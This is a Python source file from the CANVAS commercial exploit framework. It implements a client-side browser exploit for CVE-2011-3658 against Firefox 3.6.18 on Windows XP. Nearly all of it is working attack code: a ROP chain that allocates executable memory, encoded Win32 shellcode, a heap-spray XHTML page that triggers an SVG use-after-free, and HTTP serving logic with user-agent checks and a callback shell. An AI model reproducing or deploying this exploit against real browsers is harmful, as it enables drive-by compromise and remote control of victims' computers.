#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
from encoder import xorencoder, nibble_encoder
from shellcode import shellcodeGenerator, win32shell
import binascii
import struct
from libs.spkproxy import header, body

NAME = "firefox_nsSVGValue"
DESCRIPTION = "FireFox nsSVGValue"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = "Mozilla"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION["Date public"] = "09/25/2008"
DOCUMENTATION["CVE Name"] = "CVE-2011-3658"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3658"
DOCUMENTATION["Note"] = ""

VERSION = "1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES = """
Tested on Windows XP SP3 with Mozilla FireFox 3.6.18.

"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.AcceptAll
        #self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.badstring="\x00" #
        self.version=1
        self.name=NAME
        self.filename = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.xhtml"

    def is_vulnerable(self, info_dict):
        if "Firefox" and "3.6.18" in info_dict['user_agent']:
            return 100
        else:
            self.log("[EE] Not Firefox 3.6.18 - possibly vulnerable, but not to this exploit or the current version of this exploit")
            return 0

    def createAndEncodeShellcode(self):
        self.createWin32ClientSideShellcode()
        self.shellcode = self.intel_encode(self.badstring, self.shellcode)

    def urlencode(self, buf):
        tmp = ""
        i = 0
        if len(buf) % 2 == 0:
            for c in buf:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1
            return tmp
        else:
            for c in buf[:-1]:
                if i == 1:
                    b = ord(c)
                    tmp+="%%u%2.2x%2.2x"%(b,a)
                    i = 0
                else:
                    a = ord(c)
                    i += 1
            tmp += "%%u%2.2x"%(ord(buf[-1]))
            return tmp

    def get_rop(self):
        rop = """
            var rop = "";
            rop += unescape("%uB565%u1004"); // 0x1004B565  # MOV EDX, [EAX] # MOV ECX, EAX # JMP [EDX+8]
            rop += unescape("%u00FC%u2000"); // 0x200000FC
            rop += unescape("%u6ADD%u1011"); // 0x10116ADD  # RET
            rop += unescape("%u56E0%u7817"); // 0x781756E0  # MOV ESP, [EDX+10] # ADD ESP, 4 # JMP [EDX+14]
            while (rop.length != 0x100/2)
                rop += rop;

            rop_gadgets = unescape(
                "%u2420%u1046" + // 0x10462420  # POP EBX # RETN
                "%u1284%u1084" + // 0x10841284  # ptr to &VirtualAlloc()
                "%u2C1F%u106C" + // 0x106C2C1F  # MOV ESI,DWORD PTR DS:[EBX] # RETN
                "%u26AA%u1001" + // 0x100126AA  # POP EAX # RETN
                "%uFFFC%uFFFF" + // 0xFFFFFFFC  # Value to negate, will become 0x00000004
                "%u4EA2%u102F" + // 0x102F4EA2  # NEG EAX # RETN
                "%uCD66%u106B" + // 0x106BCD66  # XCHG EAX,EDX # RETN
                "%uDC75%u105F" + // 0x105FDC75  # POP EDI # RETN
                "%u0001%u0001" + // XOR_KEY = 0x00010001
                "%u2420%u1046" + // 0x10462420  # POP EBX # RETN
                "%u0150%u2000" + // parameters to un-XOR
                "%uDB0E%u1006" + // 0x1006DB0E  # XOR DWORD PTR [EBX], EDI # RETN
                "%u139B%u103F" + // 0x103F139B  # ADD EBX,EDX # RETN
                "%uDB0E%u1006" + // 0x1006DB0E  # XOR DWORD PTR [EBX], EDI # RETN
                "%u139B%u103F" + // 0x103F139B  # ADD EBX,EDX # RETN
                "%uDB0E%u1006" + // 0x1006DB0E  # XOR DWORD PTR [EBX], EDI # RETN
                "%u139B%u103F" + // 0x103F139B  # ADD EBX,EDX # RETN
                "%uDB0E%u1006" + // 0x1006DB0E  # XOR DWORD PTR [EBX], EDI # RETN
                "%u88E6%u105D" + // 0x105d88e6  # JMP ESI
                "%u59B5%u102E" + // 0x102E59B5  # ret VirtualAllocEx  # POP EBX # POP ESI # RET
                "%u0001%u0001" + // 0x00010001  # lpAddress = NULL
                "%u1001%u0001" + // 0x00011001  # dwSize = 0x1000
                "%u1001%u0001" + // 0x00011001  # flAllocationType = MEM_COMMIT
                "%u0041%u0001" + // 0x00010041  # flProtect = PAGE_EXECUTE_READWRITE
                "%u0170%u2000" + // EBX = 0x20000170
                "%u0188%u2000" + // ESI = 0x20000188 (memcpy source)
                "%uDB0E%u1006" + // 0x1006DB0E  # XOR DWORD PTR [EBX], EDI # RETN
                "%ue312%u1064" + // 0x1064e312  # POP ECX # RETN
                "%u0401%u0001" + // ECX = 0x00000400 (memcpy size)
                "%uDA5B%u1014" + // 0x1014DA5B  # LEA EDI,[EAX] # RET
                "%u2266%u1000" + // 0x10002266  # REP MOVS [EDI], [ESI] # ... # RETN
                "%u9090%u9090" + // 0x90909090  # nop
                "%u9090%u9090" + // 0x90909090  # nop
                "%uCB5F%u1021" + // 0x1021CB5F  # JMP EAX
                "");


            rop += rop_gadgets;
        """
        return rop

    def generate_html(self):
        html = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

        <html xmlns="http://www.w3.org/1999/xhtml">

        <head>

        <script type="text/javascript">
        <![CDATA[
            var container = [];
            var tls = [];
            var rect = null;
            var big = null;
            var small = null;

            %s // rop
            var shellcode = unescape("%s");

            rop += shellcode;
            while (rop.length != 0x00100000/2 - 0x100/2)
                rop += unescape("%%u9090");

            var filler = "";
            for (i=0; i< 0x100/2; i++)
                filler += unescape("%%u9090");

            var mem1 = "";
            for (i=0; i< ((0x01000000/2)/(0x00100000/2))-1; i++)
                mem1 += (rop+filler);
            mem1 += rop;

            var mem = [];
            for (i=0; i<0x20; i++)
                mem.push(unescape(mem1));


            function listener() {
                rect.removeEventListener("DOMAttrModified", listener, false);

                for (i=128; i<256; i++) {
                    tls[i].clear();
                }

                //heap spray
                for (i = 0; i < (1<<23); ++i)
                    container.push(unescape(small));
            }

            function run() {
                var svg = document.getElementById("svg");
                rect = document.getElementById("rect");

                for (i = 0; i < 256; ++i) {
                    rect = rect.cloneNode(false);
                    var atl = rect.transform;
                    var tl = atl.baseVal;
                    tls.push(tl);
                }

                small = unescape("%%u0034%%u2000");   //0x20000034
                small += unescape("%%u0000%%u0000");
                small += unescape("%%u0000%%u0000");

                var trans = svg.createSVGTransform();
                for each (tl in tls)
                    tl.appendItem(trans);

                rect.addEventListener("DOMAttrModified", listener, false);
                var matrix = svg.createSVGMatrix();
                trans.setMatrix(matrix);
            }
        ]]>
        </script>

        </head>

        <body onload="run();">
        <svg xmlns="http://www.w3.org/2000/svg" version="1.1"
            id="svg" width="200px" height="200px">
            <rect
            id="rect"
            x="0"
            y="0"
            width="10"
            height="10"
            fill="red"
            stroke="black"/>
        </svg>
        </body>

        </html>

        """
        self.log(len(self.shellcode))
        html = html % (self.rop, self.urlencode(self.shellcode))
        return html

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        self.rop = self.get_rop()

        if clientheader.URL.endswith(self.filename):
            self.log('Serving HTML file')

            self.createAndEncodeShellcode()
            html = self.generate_html()

            b.setBody(html)
            h.addHeader('Content-Type','application/xhtml+xml')

        elif clientheader.URL.count("exit"):
            self.log('[-] Max retries reached. Exploit failed')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h, b

        else:
            self.log('[+] Redirecting to self')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')

        return h, b

    def run(self):
        self.createAndEncodeShellcode()

        self.rop = self.get_rop()
        html = self.generate_html()
        self.log('[+] Opening %s for output' % (self.filename))

        fd = file(self.filename,'wb+')
        fd.write(html)
        fd.close()
        self.log('[+] Wrote to %s' % (self.filename))

        return 1

if __name__ == '__main__':
    exp = theexploit()
    ret = standard_callback_commandline(exp)
    if ret not in [0, 1, None]:
        ret.interact()
